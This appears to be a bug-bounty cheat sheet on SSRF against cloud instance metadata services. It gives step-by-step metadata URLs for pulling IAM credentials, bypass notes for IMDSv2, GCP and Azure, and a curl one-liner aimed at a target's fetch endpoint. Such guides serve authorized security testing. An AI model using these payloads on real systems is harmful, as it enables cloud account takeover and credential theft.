# Server-Side Request Forgery — IMDS

## 📌 What It Is
SSRF that reaches the cloud instance metadata service (169.254.169.254) and reads IAM credentials.

## 🔍 How to Find It
Find any URL/host parameter that the server fetches. Try `http://169.254.169.254/latest/meta-data/`.

## 🧪 How to Test It
Inject into image-fetch, webhook, URL preview, profile picture URL, OAuth callback fetcher.

## 💣 How to Exploit It
1. Probe with `http://169.254.169.254/latest/meta-data/` → list of metadata keys.\n2. `http://169.254.169.254/latest/meta-data/iam/security-credentials/` → role name.\n3. `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` → AccessKeyId/SecretAccessKey/Token.\n4. `aws sts get-caller-identity` with creds → confirm.

## 🔄 Bypass Techniques
IMDSv2: requires PUT to /latest/api/token first with TTL header. If only IMDSv2 enabled, SSRF must support PUT or send custom headers. Try `gopher://169.254.169.254/...`.\nGCP needs `Metadata-Flavor: Google` header. Azure needs `Metadata: true` header.

## 🛠️ Tools
- ssrfmap, gopherus, interactsh-client

## 🎯 Payloads
See PAYLOADS/ssrf_payloads_bypasses.md

## 📝 Real-World Examples
Capital One 2019 (S3 + IAM). Microsoft Azure SSRF (multiple). HackerOne reports #h1-XXX.

## 🚩 Common Mistakes / Traps
Don't pivot beyond IAM read. Don't list S3 buckets you weren't authorized for.

## 📊 Severity & Impact
Critical (CVSS 9.8). Cloud account takeover.

## 🔗 References
AWS IMDSv2 docs, Capital One incident report.

## ⚡ One-Liners
```bash\ncurl 'https://target/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'\n```
